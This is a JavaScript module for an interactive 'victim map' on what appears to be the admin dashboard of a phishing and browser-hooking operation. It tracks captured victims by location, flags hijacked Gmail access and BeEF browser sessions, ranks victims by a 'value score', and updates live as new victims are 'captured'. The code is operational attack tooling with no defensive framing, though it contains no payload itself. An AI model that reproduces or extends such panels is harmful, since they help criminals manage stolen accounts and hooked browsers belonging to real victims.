/**
 * Victim Map Module
 * Handles interactive world map with victim locations and real-time updates
 */

class VictimMap {
    constructor(mapContainerId = 'victimMap') {
        this.mapContainerId = mapContainerId;
        this.map = null;
        this.markers = new Map();
        this.clusters = null;
        this.victimData = [];
        this.updateInterval = null;
        
        // Map configuration
        this.mapConfig = {
            center: [20.0, 105.0], // Vietnam center
            zoom: 4,
            minZoom: 2,
            maxZoom: 18
        };
        
        // Marker styles
        this.markerStyles = {
            victim: {
                color: '#dc3545',
                radius: 8,
                weight: 2,
                opacity: 1,
                fillOpacity: 0.8
            },
            gmail: {
                color: '#28a745',
                radius: 10,
                weight: 2,
                opacity: 1,
                fillOpacity: 0.8
            },
            beef: {
                color: '#ffc107',
                radius: 12,
                weight: 2,
                opacity: 1,
                fillOpacity: 0.8
            },
            highValue: {
                color: '#6f42c1',
                radius: 15,
                weight: 3,
                opacity: 1,
                fillOpacity: 0.9
            }
        };
        
        this.init();
    }
    
    init() {
        this.initializeMap();
        this.setupEventListeners();
        this.startRealTimeUpdates();
    }
    
    initializeMap() {
        const mapElement = document.getElementById(this.mapContainerId);
        if (!mapElement) {
            console.error(`Map container with id '${this.mapContainerId}' not found`);
            return;
        }
        
        // Initialize Leaflet map
        this.map = L.map(this.mapContainerId, {
            center: this.mapConfig.center,
            zoom: this.mapConfig.zoom,
            minZoom: this.mapConfig.minZoom,
            maxZoom: this.mapConfig.maxZoom,
            zoomControl: true,
            attributionControl: true
        });
        
        // Add tile layer
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap contributors',
            maxZoom: 18
        }).addTo(this.map);
        
        // Add custom controls
        this.addMapControls();
        
        // Load initial victim data
        this.loadVictimData();
    }
    
    addMapControls() {
        // Add custom control panel
        const controlPanel = L.control({ position: 'topright' });
        
        controlPanel.onAdd = (map) => {
            const div = L.DomUtil.create('div', 'map-control-panel');
            div.innerHTML = `
                <div class="card" style="width: 250px;">
                    <div class="card-header">
                        <h6 class="mb-0">
                            <i class="fas fa-map-marked-alt me-2"></i>
                            Victim Map Controls
                        </h6>
                    </div>
                    <div class="card-body p-2">
                        <div class="form-check mb-2">
                            <input class="form-check-input" type="checkbox" id="showVictims" checked>
                            <label class="form-check-label" for="showVictims">
                                Show Victims
                            </label>
                        </div>
                        <div class="form-check mb-2">
                            <input class="form-check-input" type="checkbox" id="showGmail" checked>
                            <label class="form-check-label" for="showGmail">
                                Show Gmail Access
                            </label>
                        </div>
                        <div class="form-check mb-2">
                            <input class="form-check-input" type="checkbox" id="showBeef" checked>
                            <label class="form-check-label" for="showBeef">
                                Show BeEF Sessions
                            </label>
                        </div>
                        <div class="form-check mb-2">
                            <input class="form-check-input" type="checkbox" id="showHighValue" checked>
                            <label class="form-check-label" for="showHighValue">
                                Show High Value
                            </label>
                        </div>
                        <hr class="my-2">
                        <div class="d-grid gap-2">
                            <button class="btn btn-sm btn-primary" onclick="victimMap.fitToVictims()">
                                <i class="fas fa-expand-arrows-alt me-1"></i>
                                Fit to Victims
                            </button>
                            <button class="btn btn-sm btn-secondary" onclick="victimMap.clearMarkers()">
                                <i class="fas fa-trash me-1"></i>
                                Clear Markers
                            </button>
                        </div>
                    </div>
                </div>
            `;
            
            // Add event listeners for checkboxes
            div.querySelector('#showVictims').addEventListener('change', (e) => {
                this.toggleMarkerType('victim', e.target.checked);
            });
            
            div.querySelector('#showGmail').addEventListener('change', (e) => {
                this.toggleMarkerType('gmail', e.target.checked);
            });
            
            div.querySelector('#showBeef').addEventListener('change', (e) => {
                this.toggleMarkerType('beef', e.target.checked);
            });
            
            div.querySelector('#showHighValue').addEventListener('change', (e) => {
                this.toggleMarkerType('highValue', e.target.checked);
            });
            
            return div;
        };
        
        controlPanel.addTo(this.map);
        
        // Add legend
        this.addLegend();
    }
    
    addLegend() {
        const legend = L.control({ position: 'bottomright' });
        
        legend.onAdd = (map) => {
            const div = L.DomUtil.create('div', 'map-legend');
            div.innerHTML = `
                <div class="card">
                    <div class="card-header">
                        <h6 class="mb-0">Legend</h6>
                    </div>
                    <div class="card-body p-2">
                        <div class="d-flex align-items-center mb-1">
                            <div class="legend-marker victim me-2"></div>
                            <small>Victims</small>
                        </div>
                        <div class="d-flex align-items-center mb-1">
                            <div class="legend-marker gmail me-2"></div>
                            <small>Gmail Access</small>
                        </div>
                        <div class="d-flex align-items-center mb-1">
                            <div class="legend-marker beef me-2"></div>
                            <small>BeEF Sessions</small>
                        </div>
                        <div class="d-flex align-items-center mb-1">
                            <div class="legend-marker high-value me-2"></div>
                            <small>High Value</small>
                        </div>
                    </div>
                </div>
            `;
            
            // Add CSS for legend markers
            const style = document.createElement('style');
            style.textContent = `
                .legend-marker {
                    width: 12px;
                    height: 12px;
                    border-radius: 50%;
                    border: 2px solid #fff;
                }
                .legend-marker.victim { background-color: #dc3545; }
                .legend-marker.gmail { background-color: #28a745; }
                .legend-marker.beef { background-color: #ffc107; }
                .legend-marker.high-value { background-color: #6f42c1; }
            `;
            document.head.appendChild(style);
            
            return div;
        };
        
        legend.addTo(this.map);
    }
    
    setupEventListeners() {
        // Map click event
        this.map.on('click', (e) => {
            this.handleMapClick(e);
        });
        
        // Marker click events will be set when markers are created
    }
    
    handleMapClick(e) {
        const lat = e.latlng.lat.toFixed(4);
        const lng = e.latlng.lng.toFixed(4);
        
        // Show coordinates popup
        L.popup()
            .setLatLng(e.latlng)
            .setContent(`
                <div class="text-center">
                    <strong>Coordinates</strong><br>
                    Lat: ${lat}<br>
                    Lng: ${lng}
                </div>
            `)
            .openOn(this.map);
    }
    
    loadVictimData() {
        fetch('/api/admin/dashboard/victim-map-data')
            .then(response => response.json())
            .then(data => {
                this.victimData = data.victims || [];
                this.renderVictims();
            })
            .catch(error => {
                console.error('Error loading victim data:', error);
                // Load sample data for demonstration
                this.loadSampleData();
            });
    }
    
    loadSampleData() {
        this.victimData = [
            {
                id: 'victim_1',
                lat: 21.0285,
                lng: 105.8542,
                city: 'Hanoi',
                country: 'Vietnam',
                type: 'victim',
                email: 'victim1@example.com',
                captured_at: new Date().toISOString(),
                gmail_access: true,
                beef_session: true,
                value_score: 85
            },
            {
                id: 'victim_2',
                lat: 10.8231,
                lng: 106.6297,
                city: 'Ho Chi Minh City',
                country: 'Vietnam',
                type: 'victim',
                email: 'victim2@example.com',
                captured_at: new Date().toISOString(),
                gmail_access: true,
                beef_session: false,
                value_score: 92
            },
            {
                id: 'victim_3',
                lat: 40.7128,
                lng: -74.0060,
                city: 'New York',
                country: 'United States',
                type: 'victim',
                email: 'victim3@example.com',
                captured_at: new Date().toISOString(),
                gmail_access: false,
                beef_session: true,
                value_score: 78
            },
            {
                id: 'victim_4',
                lat: 51.5074,
                lng: -0.1278,
                city: 'London',
                country: 'United Kingdom',
                type: 'victim',
                email: 'victim4@example.com',
                captured_at: new Date().toISOString(),
                gmail_access: true,
                beef_session: true,
                value_score: 95
            }
        ];
        
        this.renderVictims();
    }
    
    renderVictims() {
        this.clearMarkers();
        
        this.victimData.forEach(victim => {
            this.addVictimMarker(victim);
        });
        
        // Update map bounds to fit all markers
        this.fitToVictims();
    }
    
    addVictimMarker(victim) {
        const markerId = `marker_${victim.id}`;
        
        // Determine marker style based on victim status
        let markerStyle = this.markerStyles.victim;
        let markerType = 'victim';
        
        if (victim.value_score >= 90) {
            markerStyle = this.markerStyles.highValue;
            markerType = 'highValue';
        } else if (victim.beef_session) {
            markerStyle = this.markerStyles.beef;
            markerType = 'beef';
        } else if (victim.gmail_access) {
            markerStyle = this.markerStyles.gmail;
            markerType = 'gmail';
        }
        
        // Create circle marker
        const marker = L.circleMarker([victim.lat, victim.lng], {
            radius: markerStyle.radius,
            fillColor: markerStyle.color,
            color: '#fff',
            weight: markerStyle.weight,
            opacity: markerStyle.opacity,
            fillOpacity: markerStyle.fillOpacity,
            className: `victim-marker ${markerType}`
        });
        
        // Create popup content
        const popupContent = this.createPopupContent(victim);
        marker.bindPopup(popupContent);
        
        // Add click event
        marker.on('click', (e) => {
            this.handleMarkerClick(victim, e);
        });
        
        // Add to map
        marker.addTo(this.map);
        
        // Store marker reference
        this.markers.set(markerId, {
            marker: marker,
            victim: victim,
            type: markerType,
            visible: true
        });
    }
    
    createPopupContent(victim) {
        const statusBadges = [];
        
        if (victim.gmail_access) {
            statusBadges.push('<span class="badge bg-success me-1">Gmail</span>');
        }
        
        if (victim.beef_session) {
            statusBadges.push('<span class="badge bg-warning me-1">BeEF</span>');
        }
        
        if (victim.value_score >= 90) {
            statusBadges.push('<span class="badge bg-danger me-1">High Value</span>');
        }
        
        return `
            <div class="victim-popup">
                <div class="d-flex justify-content-between align-items-start mb-2">
                    <h6 class="mb-0">${victim.email}</h6>
                    <small class="text-muted">${victim.value_score}/100</small>
                </div>
                <div class="mb-2">
                    <strong>${victim.city}, ${victim.country}</strong>
                </div>
                <div class="mb-2">
                    ${statusBadges.join('')}
                </div>
                <div class="mb-2">
                    <small class="text-muted">
                        Captured: ${new Date(victim.captured_at).toLocaleString()}
                    </small>
                </div>
                <div class="d-grid gap-1">
                    <button class="btn btn-sm btn-primary" onclick="victimMap.viewVictimProfile('${victim.id}')">
                        <i class="fas fa-user me-1"></i>
                        View Profile
                    </button>
                    <button class="btn btn-sm btn-secondary" onclick="victimMap.analyzeVictim('${victim.id}')">
                        <i class="fas fa-search me-1"></i>
                        Analyze
                    </button>
                </div>
            </div>
        `;
    }
    
    handleMarkerClick(victim, event) {
        // Emit custom event for other components to listen
        const customEvent = new CustomEvent('victimMarkerClick', {
            detail: {
                victim: victim,
                latlng: event.latlng
            }
        });
        
        document.dispatchEvent(customEvent);
    }
    
    toggleMarkerType(type, visible) {
        this.markers.forEach((markerData, markerId) => {
            if (markerData.type === type) {
                if (visible) {
                    markerData.marker.addTo(this.map);
                    markerData.visible = true;
                } else {
                    markerData.marker.remove();
                    markerData.visible = false;
                }
            }
        });
    }
    
    clearMarkers() {
        this.markers.forEach((markerData, markerId) => {
            markerData.marker.remove();
        });
        this.markers.clear();
    }
    
    fitToVictims() {
        if (this.markers.size === 0) return;
        
        const group = new L.featureGroup();
        this.markers.forEach((markerData) => {
            if (markerData.visible) {
                group.addLayer(markerData.marker);
            }
        });
        
        if (group.getLayers().length > 0) {
            this.map.fitBounds(group.getBounds(), { padding: [20, 20] });
        }
    }
    
    addNewVictim(victimData) {
        // Add new victim to data
        this.victimData.push(victimData);
        
        // Add marker
        this.addVictimMarker(victimData);
        
        // Show notification
        this.showVictimNotification(victimData);
    }
    
    showVictimNotification(victim) {
        // Create temporary marker with animation
        const tempMarker = L.circleMarker([victim.lat, victim.lng], {
            radius: 20,
            fillColor: '#dc3545',
            color: '#fff',
            weight: 3,
            opacity: 1,
            fillOpacity: 0.8,
            className: 'new-victim-marker'
        });
        
        tempMarker.addTo(this.map);
        
        // Animate marker
        let radius = 20;
        const animate = () => {
            radius -= 1;
            tempMarker.setRadius(radius);
            
            if (radius > 8) {
                setTimeout(animate, 50);
            } else {
                tempMarker.remove();
            }
        };
        
        animate();
        
        // Pan to new victim
        this.map.panTo([victim.lat, victim.lng]);
    }
    
    viewVictimProfile(victimId) {
        // Navigate to victim profile page
        window.location.href = `/admin/victim-profile/${victimId}`;
    }
    
    analyzeVictim(victimId) {
        // Open victim analysis modal
        const victim = this.victimData.find(v => v.id === victimId);
        if (victim) {
            this.openAnalysisModal(victim);
        }
    }
    
    openAnalysisModal(victim) {
        // Create and show analysis modal
        const modalHtml = `
            <div class="modal fade" id="victimAnalysisModal" tabindex="-1">
                <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title">Victim Analysis - ${victim.email}</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                        </div>
                        <div class="modal-body">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6>Basic Information</h6>
                                    <p><strong>Email:</strong> ${victim.email}</p>
                                    <p><strong>Location:</strong> ${victim.city}, ${victim.country}</p>
                                    <p><strong>Captured:</strong> ${new Date(victim.captured_at).toLocaleString()}</p>
                                    <p><strong>Value Score:</strong> ${victim.value_score}/100</p>
                                </div>
                                <div class="col-md-6">
                                    <h6>Status</h6>
                                    <p><strong>Gmail Access:</strong> ${victim.gmail_access ? 'Yes' : 'No'}</p>
                                    <p><strong>BeEF Session:</strong> ${victim.beef_session ? 'Active' : 'None'}</p>
                                    <p><strong>Risk Level:</strong> ${victim.value_score >= 90 ? 'High' : victim.value_score >= 70 ? 'Medium' : 'Low'}</p>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                            <button type="button" class="btn btn-primary" onclick="victimMap.viewVictimProfile('${victim.id}')">View Full Profile</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        // Remove existing modal if present
        const existingModal = document.getElementById('victimAnalysisModal');
        if (existingModal) {
            existingModal.remove();
        }
        
        // Add modal to DOM
        document.body.insertAdjacentHTML('beforeend', modalHtml);
        
        // Show modal
        const modal = new bootstrap.Modal(document.getElementById('victimAnalysisModal'));
        modal.show();
    }
    
    startRealTimeUpdates() {
        // Update map data every 30 seconds
        this.updateInterval = setInterval(() => {
            this.loadVictimData();
        }, 30000);
        
        // Listen for WebSocket updates
        if (window.websocket) {
            window.websocket.addEventListener('message', (event) => {
                const data = JSON.parse(event.data);
                if (data.type === 'victim_captured') {
                    this.addNewVictim(data.data);
                }
            });
        }
    }
    
    stopRealTimeUpdates() {
        if (this.updateInterval) {
            clearInterval(this.updateInterval);
            this.updateInterval = null;
        }
    }
    
    destroy() {
        this.stopRealTimeUpdates();
        this.clearMarkers();
        
        if (this.map) {
            this.map.remove();
            this.map = null;
        }
    }
}

// Initialize victim map when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    window.victimMap = new VictimMap();
});

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
    module.exports = VictimMap;
}
